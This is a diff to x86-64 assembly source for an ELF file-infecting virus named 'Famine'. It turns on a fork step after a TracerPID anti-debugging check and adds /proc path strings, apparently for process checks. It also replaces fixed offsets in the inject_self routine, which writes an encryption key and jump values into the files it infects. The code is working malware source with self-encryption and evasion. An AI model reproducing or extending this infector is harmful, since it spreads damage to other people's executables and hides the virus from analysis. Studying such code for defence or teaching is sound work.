@@ -41,16 +41,17 @@ add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 jne _exx_pop
 
+.OUI:
+
 jmp .enc_start
 DECYPHER
 
 
 .enc_start:
-;	mov rax, _fork
-;	syscall
-;	cmp rax, 0
-;	POP
-;	jne _exx
+	mov rax, _fork
+	syscall
+	cmp rax, 0
+	jne _exx_pop
 
 .get_rand_key:
 	lea rdi, [rel random]
@@ -126,7 +127,7 @@ DECYPHER
 	cmp byte[rdi], 0
 	jnz .opendir
 	POP		; restore register 
-	jmp _exx		;jump to the end
+	jmp _exx.exit		;jump to the end
 
 process:
 	mov rsi, r14  ; r14 hold infect dir
@@ -293,7 +294,7 @@ inject_self:
 	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
 	lea rsi, [rel signature]
 	mov rdx, 1
-	add r10, 138 ; FILE EOF + 25 = JUMP OVER DECYPHER VAL OFFSET
+	add r10, JUMP_DECYPHER_OFFSET ; JUMP OVER DECYPHER VAL OFFSET
 	syscall
 
 	pop r10
@@ -302,7 +303,7 @@ inject_self:
 	mov rax, _pwrite			;OVERWRITE THE VALUE OF KEY IN DECYPHER
 	lea rsi, STACK(famine.key)
 	mov rdx, 1
-	add r10, 143 ; FILE OEF + 30 = KEY OFFSET
+	add r10, KEY_OFFSET ;  KEY OFFSET
 	syscall
 
 	pop r10
@@ -311,7 +312,7 @@ inject_self:
 	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
 	lea rsi, STACK(famine.factor)
 	mov rdx, 1
-	add r10, 179 ; FILE EOF + 80 = KEY FACTOR OFFSET
+	add r10, FACTOR_OFFSET ; KEY FACTOR OFFSET
 	syscall
 
 
@@ -394,7 +395,9 @@ random			db			"/dev/random"
 enc_end:
 	db 0
 signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
-pfile			db			"/proc/self/status"
+pfile			db			"/proc/self/status",0
+pdir			db			"/proc/",0
+pname			db			"/comm",0
 famine_entry	dq			_start
 
 _exx_pop:
